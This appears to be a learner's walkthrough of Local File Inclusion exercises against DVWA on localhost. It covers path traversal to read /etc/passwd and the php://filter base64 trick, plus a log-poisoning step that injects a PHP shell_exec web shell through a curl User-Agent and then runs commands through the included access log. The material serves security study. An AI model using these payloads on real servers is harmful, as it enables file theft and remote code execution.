# 🧠 Day 2 — Local File Inclusion (LFI) Vulnerability Walkthrough

## 🔍 What is LFI?

Local File Inclusion (LFI) is a web vulnerability that allows an attacker to include files on a server through the web browser. This can lead to information disclosure, code execution, or full server compromise depending on how it's leveraged.

---

## 🔎 Basic LFI Test: Reading `/etc/passwd`

The first parameter tested was:

http://127.0.0.1/DVWA/vulnerabilites/?page=../../../../../../etc/passwd
this gave us the access to the /etc/passwd file of the server.

The things we can note about services and users from this are: 
- The Users with **login Permissions** have: `/usr/bin/zsh`
- The services with **no login Permission** have: `/usr/sbin/nologin`
- And some are even more restricted and have: `/usr/bin/false`, which literally exit when called.
![LFI passwd Output](/Day-2-notes/Screenshots/Passwd-output.png)

## `php://filter` trick (base64 encoding)

On higher security like (high/medium), these files of the server are not just directly accessible as they are in low security level, and to get that we access them using `php://filter`

- we accessed the same `/etc/passwd` but with the phpFilter, This gave us the base64 encoded version of the output.
- to covert it back to human readable form, we ran this: 
```bash
echo "encoded string" | base64 -d
```
here '*-d*' is for decoding the string using base64.

## 🧾 Log File Injection (Log Poisoning)
This is a bit advanced trick. This lets us inject malicious code to the server's log file.
The injected payload was:
```bash
curl -A "<?php echo shell_exec(\$_GET['cmd']); ?>" http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php
```
- here, to actually run this, we had to give the access of the `/var/log/apache2/access.log` to others, to do that we ran this:
```bash
sudo chmod o+r /var/log/apache2/access.log
```
- after doing this we simply accessed a file on which we want to run the command, to execute, we accessed:
http://127.0.0.1/DVWA/vulnerabilites/fi/?page=../../../../var/log/apache2/access.log&cmd=ls

![Log inclusion output](/Day-2-notes/Screenshots/Log-inclusion-output.png) 
